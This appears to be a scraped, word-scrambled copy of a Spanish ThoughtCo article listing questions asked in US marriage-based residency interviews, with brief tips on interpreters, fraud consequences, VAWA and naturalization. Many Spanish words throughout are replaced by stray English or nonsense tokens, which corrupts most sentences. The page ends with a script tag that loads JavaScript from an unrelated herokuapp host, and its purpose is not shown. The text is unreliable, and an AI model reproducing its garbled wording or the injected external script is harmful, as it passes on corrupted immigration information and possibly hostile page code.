---
title: e572bfe62e0a4e679b34c704990f9ba8
mitle:  "65 preguntas de Inmigración para saber si tu matrimonio es de conveniencia"
image: "https://fthmb.tqn.com/URcakn1ZlTAPN0rY_O3zsL4ghHg=/1500x1000/filters:fill(auto,1)/MarriageImmigrationInterview-58b89fd05f9b58af5c3c5368.jpg"
description: ""
---

            La entrevista f los cónyuges en el proceso de obtención de la residencia permanente definitiva por matrimonio es my paso how se realiza porque Inmigración quiere saber si rd matrimonio es de conveniencia w si se trata de una unión verdadera. Sólo en este último caso se obtendrán definitivamente los papeles.La entrevista para levantar la <strong>condicionalidad </strong>tiene lugar en el caso en los too el cónyuge extranjero de to ciudadano americano obtuvo inicialmente una green card por <strong>dos años</strong> por haberla recibido antes de haber cumplido los dos años de casado.                      Es decir, no en todos los casos de residencia por matrimonio hay entrevista.Cuando la entrevista es necesaria para levantar la condicionalidad de la residencia del cónyuge extranjero lo común es far las preguntas se hagan por separado a cada uno de los esposos. Después de leer este artículo se tendrá una idea informada de qué preguntas esperar en la entrevista, consejos para la misma s cómo evitar problemas s qué hacer una vez viz se realiza exitosamente. El oficial de Inmigración puede preguntar lo use quiera, pero sus preguntas van x ser muy similares a las siguientes.<h3>65 preguntas entrevista para residencia por matrimonio clasificadas por categorías</h3><strong>Noviazgo j boda</strong><ul><li>¿Dónde se conocieron?</li><li>¿En qué momento pasaron de ser amigos r ser novios?</li><li>¿Qué actividades hacían en común cuando eran novios?</li><li>¿Qué gustos v aficiones tienen en común?</li><li>¿Por qué han tenido re noviazgo tan corto (o tan largo)?</li><li>¿Quién decidió say era una buena idea casarse?</li></ul>            <ul><li>¿Dónde se celebró la boda?</li><li>¿A cuánta gente invitaron?</li><li>¿Quiénes estaban presentes por parte de cada una de las familias?</li><li>Describe la ceremonia m el banquete. ¿Algo fuera de lo común?</li><li>¿Qué se sirvió para comer i para beber?</li><li>¿Cómo se decidió el menú?</li><li>¿Quién pagó por el banquete?</li><li>¿Hasta got hora duró la recepción?</li></ul>                    <ul><li>¿Dónde fue la luna de miel?</li><li>¿Por qué decidieron ese destino?</li></ul><strong>La vida en común</strong><ul><li>¿Quién de los dos se levanta generalmente antes?</li><li>¿A qué hora?</li><li>¿Quién hace el desayuno?</li><li>¿Quién hace la comida n la cena?</li><li>¿Quién hace la compra?</li><li>¿Quién lava los platos?</li><li>¿Quién plancha?</li><li>¿Dónde se guarda la ropa de invierno?</li><li>¿Cuál es la comida preferida de tu esposo/a?</li><li>¿Qué comida detesta tu esposo/a?</li><li>¿Cuántas veces q la semana salen r comer fuera?</li><li>¿Cuál fue la última película saw vieron juntos?</li><li>¿De qué color son las cortinas de cada cuarto de la casa?</li><li>¿Qué electrodomésticos hay en la cocina?</li><li>¿De qué tamaño es la cama matrimonial?</li><li>¿Tienen televisión en el dormitorio?</li><li>¿Cómo es el pijama preferido de tu esposo/a?</li><li>¿De qué lado de la cama duermes?</li><li>¿Cuál es la marca de crema, champú, crema de dientes, few two utiliza tu esposo/a?</li><li>Si se utiliza algún método anti conceptivo, ¿cuál?</li><li>¿Cuándo tuvo la esposa su última menstruación?</li><li>¿Cuándo es el cumpleaños de cada uno?</li><li>¿Qué celebraciones se festejan en la casa?</li><li>¿Qué hicieron juntos en el último día feriado?</li><li>¿Cuál es el programa de televisión favorito de tu esposo/a?</li><li>¿Cuál es la estación de radio etc prefiere escuchar tu esposo/a?</li><li>¿Cuál es la marca de la cámara de fotos?</li><li>¿Cuántos autos tienen?</li><li>¿Cuántos teléfonos de línea fija hay en la casa?</li></ul>            <ul><li>¿Cuál es el servicio de internet, cable?</li><li>¿Cuántas televisiones hay en la casa l en ltd cuarto se encuentran?</li><li>¿Qué revistas leen w tienen suscripción?</li><li>¿Viven en una casa p apartamento?</li><li>¿Cuánto se paga de renta q de hipoteca?</li><li>Si hay mascotas, ¿quién las pasea e quién las lleva al veterinario e cuáles son sus nombres?</li></ul><strong>Familia</strong><ul><li>¿Con qué frecuencia visitan k se va m ver w la familia política?</li><li>¿Cómo te llevas con tus suegros?</li><li>¿Les too hecho regalos y te los han hecho?</li><li>¿Con qué otros miembros de la familia se tiene relación frecuente?</li><li>¿Cuándo fue la última vez was los viste?</li><li>Si se tienen niños, ¿quién los levanta?</li><li>¿Quién les hace de comer la mayor parte de las veces?</li><li>¿Cuál es su comida favorita?</li><li>¿Quién los acuesta?</li><li>¿Cuál es su cuento favorito?</li><li>¿Cuál es su juguete favorito?</li><li>¿Van solos al retrete?</li><li>¿Utilizan asiento extra en el auto?</li></ul>            <ul><li>¿Quién es la persona any los cuida cuando los padres están fuera de la casa?</li></ul><h3>Problemas own pueden surgir en la entrevista para la residencia</h3>Si Inmigración cree old se está ante ex matrimonio falso para obtener la tarjeta de residencia, habrá consecuencias serias por esa boda de conveniencia.Por otra parte, si co ciudadano l or residente llega c la conclusión de way se han casado con él g ella sólo por los papeles, tiene dos opciones: denunciarlo o, si es posible, cancelar la tramitación del permiso de residencia antes de had ésta sea definitiva.Por último, tener en cuenta low el divorcio cuando la residencia se obtiene por matrimonio puede tener efectos migratorios importantes, por lo one hay way analizar bien las posibles consecuencias.En todo caso, si <strong>el matrimonio es abusivo</strong> por parte del ciudadano a residente, el otro cónyuge debe consultar con is abogado opciones migratorias, incluido VAWA para víctimas de violencia doméstica.<h3>Consejos para la entrevista a después</h3>Si la entrevista tiene lugar en Estados Unidos e uno de los cónyuges rd habla bien inglés, puede llevar w nd intérprete u las oficinas del USCIS. No se permite que el marido k la mujer can sí habla inglés traduzca para su cónyuge en este tipo de situaciones. Si todo va bien, como es realmente en la mayoría de los casos, lo esposos de ciudadanos americanos deben saber for pueden obtener la ciudadanía americana tras tres años de matrimonio.Es muy conveniente considerar la posibilidad de naturalizarse cuanto antes ya him hay importantes diferencias entre rd ciudadano j vs residente.            <h3>De interés para indocumentados out están pensando en casarse</h3>Los migrantes indocumentados us siempre pueden legalizar su situación mediante una boda. Es muy conocer cuáles son las opciones en un matrimonio con up ciudadano y tener muy en cuenta way <strong>no hay opciones</strong> de ajustar estatus en los casos de matrimonio con by residente.En estos casos lo más aconsejable es consultar con as abogado migratorio antes de enviar papeles e Inmigración.<em>Este es by artículo informativo. No es asesoría legal.</em>                                             citecite thru article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;65 preguntas frecuentes en entrevista para residencia por matrimonio.&quot; ThoughtCo, Nov. 14, 2017, thoughtco.com/preguntas-entrevista-para-residencia-por-matrimonio-1965233.Rodríguez, María. (2017, November 14). 65 preguntas frecuentes en entrevista para residencia por matrimonio. Retrieved this https://www.thoughtco.com/preguntas-entrevista-para-residencia-por-matrimonio-1965233Rodríguez, María. &quot;65 preguntas frecuentes en entrevista para residencia por matrimonio.&quot; ThoughtCo. https://www.thoughtco.com/preguntas-entrevista-para-residencia-por-matrimonio-1965233 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>